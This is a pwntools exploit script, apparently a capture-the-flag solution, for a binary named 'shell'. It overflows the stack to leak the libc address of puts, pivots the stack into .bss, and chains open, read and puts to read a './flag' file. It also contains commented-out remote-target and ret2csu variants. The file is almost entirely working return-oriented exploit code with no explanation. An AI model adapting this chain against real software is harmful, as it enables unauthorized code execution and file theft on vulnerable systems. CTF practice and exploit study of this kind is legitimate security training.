from pwn import *

context(arch="amd64",os='linux',log_level="debug")

for i in range(0 , 0x500):
	io = process("shell")
	#io = remote("10.212.27.23", 4396)
	elf = ELF("shell")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	#libc = ELF("./libc-2.27.so")


	#sys = elf.sym["system"]
	binsh = next(elf.search(b'sh'))
	print(hex(binsh))

	leave_ret = 0x000000000040075b
	pop_rdi_ret = 0x400863
	pop_rsi_r15_ret = 0x0000000000400861
	pop_rbx_rbp_r12_r13_r14_r15_ret = 0x000000000040085a

	bss = elf.bss() + 0x100
	print(hex(bss))

	read_plt = elf.plt["read"]
	print(hex(read_plt))

	read_got = elf.got["read"]
	print(hex(read_got))


	puts_plt = elf.plt['puts']
	puts_got = elf.got["puts"]

	'''
	first_csu = 0x400840
	second_csu = 0x400856

	#r12,r13,r14,r15需自行包装
	def ret_csu(payload, r12, r13, r14, r15, last):
		payload += p64(first_csu) + b'a' * 8
		payload += p64(0) + p64(1)
		payload += r12
		payload += r13 + r14 + r15
		payload += p64(second_csu)
		payload += b'a' * 56
		payload += p64(last)
		return payload
	'''

	#gdb.attach(io)

	pad = 0x20
	main_addr = 0x4007bc
	payload1 = (pad)*b'a' + p64(bss) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
	payload1 += p64(pop_rdi_ret) + p64(0)
	payload1 += p64(pop_rsi_r15_ret) + p64(bss) + p64(0)
	payload1 += p64(read_plt) + p64(leave_ret)

	io.sendlineafter("soft! try me :)\n", payload1)
	io.recvuntil(b'let me guess\n', drop = False)


	puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
	print(hex(puts_addr))

	libc_base = puts_addr - libc.sym["puts"]
	print(hex(libc_base))

	open_addr = libc.sym["open"] + libc_base
	read_addr = libc.sym["read"] + libc_base

	#gdb.attach(io)


	payload2  =  b'a'*0x8
	payload2 += p64(pop_rdi_ret) + p64(bss+i)   
	payload2 += p64(pop_rsi_r15_ret) + p64(0) + p64(0)
	payload2 += p64(open_addr)
	payload2 += p64(pop_rdi_ret) + p64(0x3)
	payload2 += p64(pop_rsi_r15_ret) + p64(bss+0x200) + p64(0)
	payload2 += p64(read_plt)
	payload2 += p64(pop_rdi_ret) + p64(bss+0x200)
	payload2 += p64(puts_plt) + p64(main_addr)
	payload2 += b'./flag\x00\x00'
		
	io.sendline(payload2)
	#dbg()
	io.interactive()
	io.close()
	
'''
payload1  = (pad)*b'a' + p64(bss) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
payload1 += ret_csu(p64(init_array_start), p64(0x100), p64(0), p64(0), pop_rdi_ret)
payload1 += p64(0) + p64(pop_rsi_r15_ret) + p64(bss) + p64(0)
payload1 += p64(read_plt) + p64(leave_ret)

payload1  = pad*b'a' + p64(bss) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss) + p64(0) + p64(read_plt) + p64(leave_ret)

io.sendlineafter("soft! try me :)\n", payload1)
io.recvuntil(b'let me guess\n', drop = False)


payload1  = p64(pop_rdi_ret) + p64(0) + p64(puts_got) + p64(leave_ret)
'''
                  







